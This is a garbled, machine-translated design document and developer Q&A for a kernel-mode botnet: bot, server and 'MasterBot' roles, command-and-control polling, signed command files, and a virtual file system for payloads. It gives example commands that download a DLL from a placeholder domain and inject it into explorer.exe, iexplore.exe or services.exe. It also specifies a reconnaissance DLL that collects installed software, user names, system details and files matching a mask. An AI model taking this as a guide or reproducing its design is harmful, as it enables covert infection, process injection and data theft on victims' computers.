1) Format Config. 

Bot because we have transformed into a server on the pitch. 
So Communication server only with the bot comes in a format that you are asking. 
For debugging we are well able to look like the contents of the configuration, but better
optimize its safety and for your convenience.

2) other matters at its discretion. 

All that would be reflected in the TOR.
Let's first make a base on it and then we'll have a conversation. 
Now we discuss what is necessary to put a bot server masterbot yet. 
GET POST, or let him decide.

Bot: 
able to receive files from the server to write to the vfs and run , can delete files
of vfs, can return the content vfs ( tell the server what dll successfully
loading ) , has a unique Haydee , who can transfer dll 
( ex. through file 1726353.bid (bot id) which is at the vfs)
, is able to list server at specified intervals to receive instructions , can initiate inject
dll ( located in the vfs) in the process .

Server: 
receives from the bot information recorded in the database, receives MasterBot
instructions for bots (in fact, for each boat has its own guide , maybe the database is updated
and update the database at a particular bot which the file can be removed and which is
added ) returns MasterBotu dump the database for analysis and a sid (server id). Incidentally,
The database can be stored on the vfs ( work with) and simply transfer it MasterBotu and
MasterBot received from new over the old one to overwrite . It is only necessary for the database
provide versioning .

MasterBot communicates with the server, gets the current database, instructs
(Actually updates the database) for bots, transfers dll, which is in the database.

MasterBot received from the database server lays out in its local folder. C: \ brownie_db \
To provide masterbot start with parameters: ip server, the path to the database, which
it is necessary to fill in the destination ip. Run masterbot with the parameters he knocks on the ip,
poluchetsya database from the server transmits its disabled.

We said that the communication server and encrypted bot. When you create a bot and server
masterbot need them to sign the certificate. Bot did not listen to someone else's server,
the server has not received instructions from someone else masterbota. As this moment to protect?

The database contains: Haydee bot contents vfs, date of last otstuk .
I think for each server to determine the maximum number of serviced bots ,
Nk example , if the server banging bot is not in the list of Nk , the server
will block the connection. What For? 1 ) we manage stress , 2 ) to transfer the database masterbotu
where a limited number of records is always faster . 3 ) MasterBot itself will be removed from the database
old boots .

If there is a free cheater , then we can make a small dll to collect information about the target
system. In order not to sew it into the loader . 

What will be able to:

- When creating sutured it to the list of URLs ostuka
- Ticking off at the start and every N hours (specified in the configuration )
- Returns a list of installed software
- Returns the configuration PC
- Returns the user name
- Returns the system language
- Returns the time zone
- Drawn to the url, it requests a file path , which must be returned .
- Drawn to the url, queries mask , returns a list of files to appropriate mask.


> insufficient documentation for use

> currently not clear (bk):
> 1 . how to attach to and run arbitrary instaleru dll ? documentation
> Kldr32.cfg - configuration file to attach to the DLL , 32- bit driver.
> Kldr64.cfg - configuration file for attachment DLL to a 64 -bit driver.
> Demo32.dll - 32- bit demo library .
> Demo64.dll - the 64 -bit demo library .
> project data files are missing , are mentioned only in the readme.txt.
> maybe something was not added to the Suggested version

This outdated information . The project is using kernelnogo bot implies that
 Any DLL will be loaded from a bot network. Poet configuration files to build the installer does not
 provide information to attach to the DLL driver.
Let us know if this functionality is required, - make appropriate configs .

> 2 . not describes how the distribution config , the assembly is set
> kbot.ini, how to upgrade in the future?
 Config file for a specific bot ( or group of bots ) is given by a team of SET_CONFIG MB.
 Boat requests configuration timer (parameter ConfigPeriod in KBOT.INI).
 This is the same INI file , it is stored in the bots VFS and used in the future.
 Example KBOT.INI folder \ BkBuild.
 
> what is written in the dock is encrypted , and how a signature , but what format
> Data and how to attach signature?
 Sign the file can be a utility CT (BSRV \ CT), or if the secret key is attached to the MB32 ( 64 ) .EXE is
 signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).

> the same with the teams , it is not clear how to shape the text file
> sign it ,

 A text file is generated with any text editor . Encoding - ANSI. Signed by the utility CT:
CT -s < secret key > < source file > < output file >
 or, if the private key is attached to the MB32 ( 64 ) .EXE is
 signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).
 
> Is it possible to download multiple files simultaneously? if so, what Format command ?

 No , SET_TASK SET_CONFIG and charged with one file or a group of bots bot .
 The command file can be several teams, each must begin on a new line .

> may not be assumed without masterbot operation , but this is still I write below .

> 3.KBOT: function SET_INJECT < file name on the VFS> < list of processes >
> it is not clear that inject , dll, exe? < list of processes > comma ?

an example of the file:

LOAD_FILE http://mydomain.com/myfile.dll my.dll
; http://mydomain.com/myfile.dll loads and stores
; under the name my.dll

SET_INJECT my.dll explorer.exe iexplore.exe
; asks to inject MY.DLL in the process explorer.exe and iexplore.exe

> server (SRV)
> 1 . It does not describe the format of data storage server .

> records:

> BASE < path to file> - downloads from the current database server and clients
> sohrayaet it to the specified file .
> it is not clear that this is stored in the database
 The user ID , the time the record was created , last otstuk , IP and User-Agent record was created ,
 IP and User-Agent last otstuk , ID group , the current configuration file ( name , CRC32, installation date )
 the current command file ( name , CRC32, installation date ) .
Now the database is stored in an internal format of the server. Tool to Convert give with the first update.

> 2.SET_CONFIG (SET_TASK) <ID> < name of the file on the server > [ limit ]
> MB.exe sign all by herself or her hands each time will have to be attached
> Certificates ? unfortunately I am not able to gather and see this
> utility .

Sign itself if the utility was attached a secret key. This is done by running the bat- nick
 bkbuild \ bkbuild.bat.
 
> are lacking in examples of the commands. if there is one car that
> like everything is clear , if there are 10 , it is necessary to join and give each
> command through the console ?
Yes. If you have multiple servers , you need the trailer to each in turn.
How to do better?

> 3 . in paragraph 2 for BK mentioned the work without a master bot.
> I understand that after loading the bot server.dll and how that
> start, it contains a configuration for the initial work , then this
> vehicle becomes both client and server.
> client side allows the server to upgrade and update the configuration
> server . and the server , in turn, provides access to other currently
> servers.
 That's right . You can specify inject server.dll in any system process , such as services.exe.
 
> in the case of data transfer to downstream MB are also stored in the non-
> signed the form , just as files vfs ( configure or something else )
> How is it supposed to be used ? Install on " their " server ?
Here I would like to read more . I did not understand the question.

> to understand how he must have a complete set of certificates for
> to distribute config files ,
> download at " another " car will be safe ?

Assuming that the file or subscribes to the local computer operator , or,
 uploaded to the server utility MB.EXE, which contains the secret key again, with local computer operator .
 
 Under this scheme key only on the computer operator .
